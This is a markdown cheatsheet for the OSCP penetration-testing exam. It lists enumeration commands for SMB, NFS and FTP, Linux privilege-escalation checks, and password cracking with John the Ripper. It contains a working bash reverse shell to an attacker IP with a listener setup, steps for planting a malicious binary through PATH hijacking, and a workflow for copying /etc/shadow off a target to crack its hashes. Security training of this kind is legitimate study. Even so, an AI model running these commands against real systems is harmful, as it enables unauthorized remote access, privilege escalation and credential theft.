# OSCP Cheatsheet

## Table of Contents

- [Scanning & Enumeration](#scanning--enumeration)
  - [Nmap Basics](#nmap-basics)
  - [Service Enumeration](#service-enumeration)
    - [SMB](#smb)
    - [NFS](#nfs)
    - [FTP](#ftp)
- [Reverse Shells](#reverse-shells)
  - [Bash Reverse Shell](#bash-reverse-shell)
- [Privilege Escalation](#privilege-escalation)
  - [Linux](#linux)
    - [SUID Files](#suid-files)
    - [Linux Capabilities](#linux-capabilities)
    - [Cron Jobs](#cron-jobs)
    - [Writable Directories](#writable-directories)
- [Password Cracking](#password-cracking)
  - [John the Ripper](#john-the-ripper)
  - [Unshadow](#unshadow)

---

## Scanning & Enumeration

### Nmap Basics

* **Version Detection Scan** - Probes open ports to determine service/version information

```bash
nmap -sV <target>
```

* `-sV`: Enables version detection, which probes open ports to determine what service and version is running on them

### Service Enumeration

#### SMB

* **SMB Share and User Enumeration** - Enumerates SMB shares and users on a target system

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target>
```

* `-p 445`: Scans port 445 (SMB/CIFS)
* `--script=smb-enum-shares.nse,smb-enum-users.nse`: Runs NSE scripts to enumerate SMB shares and users
* `smb-enum-shares.nse`: Lists available SMB shares on the target
* `smb-enum-users.nse`: Enumerates users on the SMB server (may require credentials)

* **Metasploit SMB Share Enumeration** - Uses Metasploit auxiliary module to enumerate SMB shares

```bash
msf6 > use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares) > set RHOSTS <target>
msf6 auxiliary(scanner/smb/smb_enumshares) > run
```

* `use auxiliary/scanner/smb/smb_enumshares`: Loads the SMB share enumeration auxiliary module
* `set RHOSTS <target>`: Sets the target IP address or range
* `run`: Executes the module to enumerate SMB shares

* **SMB Client Connection** - Connects to an SMB share using smbclient

```bash
smbclient //<target>/<share>
```

* `smbclient`: Command-line SMB/CIFS client for accessing SMB shares
* `//<target>/<share>`: Specifies the target IP and share name (e.g., `//10.81.182.140/anonymous`)
* Once connected, use commands like `ls`, `get <file>`, `put <file>`, `cd <directory>`, `exit`

* **SMB Recursive Download** - Downloads files recursively from an SMB share

```bash
smbget -R smb://<target>/<share>
```

* `smbget`: Utility to download files from SMB shares
* `-R`: Recursive flag - downloads all files and subdirectories
* `smb://<target>/<share>`: Specifies the target IP and share name (e.g., `smb://10.81.182.140/anonymous`)

#### NFS

* **NFS Share Enumeration** - Enumerates NFS shares, lists contents, and shows filesystem statistics

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target>
```

* `-p 111`: Scans port 111 (rpcbind - port mapper service used by NFS)
* `--script=nfs-ls,nfs-statfs,nfs-showmount`: Runs NSE scripts to enumerate NFS shares
* `nfs-ls.nse`: Lists files and directories in exported NFS shares with permissions, UIDs, GIDs, and timestamps
* `nfs-statfs.nse`: Shows filesystem statistics (disk space, usage percentage, max file size, etc.)
* `nfs-showmount.nse`: Lists all exported NFS shares on the target

* **Mount NFS Share** - Mounts an NFS share locally to explore its contents

```bash
mkdir /tmp/nfs_mount
mount -t nfs <target>:/<share> /tmp/nfs_mount
cd /tmp/nfs_mount
ls -la
```

* `mkdir /tmp/nfs_mount`: Creates a local directory to mount the NFS share
* `mount -t nfs`: Mounts an NFS filesystem
* `<target>:/<share>`: Specifies the target IP and exported share path (e.g., `10.81.182.140:/var`)
* `/tmp/nfs_mount`: Local mount point directory
* After mounting, explore the share with standard Linux commands (`ls`, `cat`, `find`, etc.)

* **Unmount NFS Share** - Unmounts a mounted NFS share

```bash
umount /tmp/nfs_mount
```

* `umount`: Unmounts a filesystem from the mount point

#### FTP

* **FTP Connection with Netcat** - Connects to FTP server using netcat to interact with the service

```bash
nc <target> 21
```

* `nc`: Netcat - network utility for reading from and writing to network connections
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* `21`: FTP port number
* After connecting, you can interact with the FTP server directly (try `USER anonymous`, `PASS anonymous`, `HELP`, etc.)

* **FTP Client Connection** - Connects to FTP server using ftp client

```bash
ftp <target>
```

* `ftp`: FTP client command-line tool
* `<target>`: Target IP address (e.g., `10.81.182.140`)
* Common FTP commands: `ls`, `cd <directory>`, `get <file>`, `put <file>`, `binary`, `ascii`, `passive`, `quit`

* **FTP Anonymous Login** - Attempts anonymous login to FTP server

```bash
ftp <target>
# When prompted:
# Name: anonymous
# Password: anonymous (or press Enter)
```

* Many FTP servers allow anonymous access with username `anonymous` and any password (or blank)

* **FTP Enumeration with Nmap** - Enumerates FTP service and attempts anonymous login

```bash
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst <target>
```

* `-p 21`: Scans port 21 (FTP)
* `--script=ftp-anon,ftp-bounce,ftp-syst`: Runs NSE scripts to enumerate FTP
* `ftp-anon.nse`: Checks if anonymous FTP login is allowed
* `ftp-bounce.nse`: Checks for FTP bounce attack vulnerability
* `ftp-syst.nse`: Retrieves system information from FTP server

---

## Reverse Shells

### Bash Reverse Shell

* **Bash Reverse Shell** - Creates a reverse shell connection back to the attacker's machine using bash

```bash
bash -i >& /dev/tcp/{ATTACKER-IP}/{PORT} 0>&1
```

* `bash -i`: Starts an interactive bash shell
* `>& /dev/tcp/{ATTACKER-IP}/{PORT}`: Redirects stdout and stderr to a TCP connection to the attacker's IP and port
* `0>&1`: Redirects stdin (file descriptor 0) to stdout (file descriptor 1), completing the bidirectional connection
* Replace `{ATTACKER-IP}` with your attacking machine's IP address (e.g., `10.10.10.5`)
* Replace `{PORT}` with the port you're listening on (e.g., `4444`)
* **On attacker machine**, set up a listener first: `nc -lvnp <PORT>` or `rlwrap nc -lvnp <PORT>` (for better shell interaction)
* Example: `bash -i >& /dev/tcp/10.10.10.5/4444 0>&1`
* Works on systems with bash and `/dev/tcp` support (most Linux systems)

---

## Privilege Escalation

### Linux

#### SUID Files

* **Find SUID Files** - Searches for files with SUID (Set User ID) bit set, which can be exploited for privilege escalation

```bash
find / -perm -u=s -type f 2>/dev/null
```

* `find /`: Searches from root directory
* `-perm -u=s`: Finds files with SUID bit set (executes with owner's privileges)
* `-type f`: Only searches for files (not directories)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* SUID files run with the privileges of the file owner, which can be exploited if the owner is root
* Common exploitable SUID binaries: `find`, `nmap`, `vim`, `nano`, `less`, `more`, `cp`, `mv`, etc.

* **Find SUID Files (Detailed Listing)** - Searches for SUID files with detailed file information to verify specific binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

* `find /`: Searches from root directory
* `-type f`: Only searches for files (not directories)
* `-perm -04000`: Finds files with SUID bit set using octal notation (04000 = SUID bit)
* `-ls`: Provides detailed listing similar to `ls -l` (shows permissions, owner, size, timestamps, etc.)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* Use this command to see detailed information about SUID files, including verifying that the nano text editor has the SUID bit set
* More useful when you need detailed information about SUID files (permissions, ownership, size) to identify exploitable binaries

#### Linux Capabilities

* **Find Files with Capabilities** - Searches for files with Linux capabilities set, which can be exploited for privilege escalation

```bash
getcap -r / 2>/dev/null
```

* `getcap`: Command to display capabilities of files
* `-r`: Recursive flag - searches recursively through directories
* `/`: Starting directory (root directory)
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* Linux capabilities provide fine-grained control over privileges, allowing specific capabilities without full root access
* Files with dangerous capabilities (like `cap_setuid`, `cap_sys_admin`, `cap_dac_override`) can be exploited for privilege escalation
* Common exploitable capabilities: `cap_setuid+ep` (can set UID), `cap_sys_admin+ep` (system administration), `cap_dac_override+ep` (bypass file permissions)

#### Cron Jobs

* **Check System Cron Jobs** - Views system-wide cron jobs that may run with elevated privileges

```bash
cat /etc/crontab
```

* `/etc/crontab`: System-wide crontab file that defines scheduled tasks
* Cron jobs that run as root can be exploited if they execute scripts in writable directories
* Look for cron jobs that run scripts you can modify or that run from directories you have write access to

* **Check User Cron Jobs** - Views user-specific cron jobs

```bash
crontab -l
```

* `crontab -l`: Lists cron jobs for the current user
* Check if any cron jobs run scripts you can modify

* **Check All Cron Directories** - Checks common cron directories for scheduled tasks

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/*
```

* `/etc/cron*`: System cron directories (`/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, etc.)
* `/var/spool/cron/crontabs/*`: User-specific crontab files
* Look for scripts referenced in cron jobs that are writable or in writable directories

* **Find Writable Cron Scripts** - Searches for writable scripts referenced in cron jobs

```bash
find /etc/cron* -type f -perm -0002 2>/dev/null
```

* `find /etc/cron*`: Searches in cron directories
* `-type f`: Only searches for files
* `-perm -0002`: Finds files with world-writable permissions (anyone can modify)
* `2>/dev/null`: Suppresses error messages
* If a cron job runs a world-writable script, you can modify it to execute commands as the cron job's user (often root)

* **Check Cron Job Permissions** - Lists cron files with detailed permissions

```bash
ls -la /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null
```

* Shows detailed file permissions, ownership, and timestamps
* Helps identify which cron jobs run as root and which scripts they execute
* Look for scripts in directories you have write access to (e.g., `/tmp`, `/var/tmp`, user home directories)

#### Writable Directories

* **Find Writable Directories** - Searches for writable directories that may be exploitable for privilege escalation

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

* `find / -writable`: Finds all writable files and directories starting from root
* `2>/dev/null`: Suppresses error messages (permission denied, etc.)
* `cut -d "/" -f 2,3`: Extracts the first two directory levels (e.g., `/tmp`, `/var/tmp`, `/home/user`)
* `grep -v proc`: Excludes `/proc` directory (virtual filesystem, not useful for exploitation)
* `sort -u`: Sorts and shows only unique directory paths
* Writable directories can be exploited if:
  * Cron jobs execute scripts from these directories
  * PATH manipulation (placing malicious binaries in writable directories in PATH)
  * Log file manipulation (if log files are in writable directories)
  * Configuration file modification (if config files are writable)
* Common writable directories: `/tmp`, `/var/tmp`, `/dev/shm`, user home directories, `/opt`, `/var/www`

* **PATH Manipulation** - Modifies the PATH environment variable to include a writable directory for privilege escalation

```bash
export PATH=/tmp:$PATH
```

* `export PATH=/tmp:$PATH`: Prepends `/tmp` to the beginning of the PATH environment variable
* `/tmp`: Writable directory (can be any writable directory like `/var/tmp`, `/home/user`, etc.)
* `:$PATH`: Appends the original PATH after the new directory
* **Exploitation scenario**: If a SUID binary or cron job runs a command without an absolute path (e.g., `ls` instead of `/bin/ls`), it will search directories in PATH order
* **Steps to exploit**:
  1. Create a malicious binary with the same name as a command (e.g., `ls`, `cat`, `python`)
  2. Place it in the writable directory (e.g., `/tmp/ls`)
  3. Make it executable: `chmod +x /tmp/ls`
  4. Export PATH: `export PATH=/tmp:$PATH`
  5. When the SUID binary or cron job runs the command, it will execute your malicious binary with elevated privileges
* **Check for exploitable binaries**: Look for SUID binaries or cron jobs that call commands without absolute paths

---

## Password Cracking

### John the Ripper

* **Crack Password Hash** - Cracks password hashes using John the Ripper with a wordlist

```bash
john --format=crypt --wordlist=rockyou.txt hash.txt
```

* `john`: John the Ripper password cracking tool
* `--format=crypt`: Specifies the hash format (crypt format for traditional Unix password hashes)
* `--wordlist=rockyou.txt`: Uses the rockyou.txt wordlist (commonly located in `/usr/share/wordlists/rockyou.txt`)
* `hash.txt`: File containing the password hash(es) to crack
* Common hash formats: `crypt` (Unix), `md5crypt`, `sha512crypt`, `NT` (Windows), `raw-md5`, `raw-sha1`, etc.
* To identify hash format automatically, use: `john --format=auto hash.txt` or `hashid hash.txt`

### Unshadow

* **Combine passwd and shadow files** - Combines `/etc/passwd` and `/etc/shadow` files into a format that John the Ripper can crack

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

* `unshadow`: Utility from the John the Ripper suite that combines passwd and shadow files
* `/etc/passwd`: Contains user account information (username, UID, GID, home directory, shell)
* `/etc/shadow`: Contains password hashes (only readable by root)
* `> hashes.txt`: Outputs the combined file in a format John can crack
* **Usage scenario**: After gaining root access, extract password hashes to crack user passwords
* **Workflow**:
  1. On target machine (as root): `cat /etc/passwd > passwd.txt` and `cat /etc/shadow > shadow.txt`
  2. Transfer files to attacking machine
  3. Run: `unshadow passwd.txt shadow.txt > unshadowed.txt`
  4. Crack with John: `john --wordlist=rockyou.txt unshadowed.txt`
* **Output format**: Combines username from `/etc/passwd` with hash from `/etc/shadow` (e.g., `username:$6$salt$hash:1001:1001:User Name:/home/username:/bin/bash`)
* Useful for password reuse attacks and gaining access to other user accounts on the system
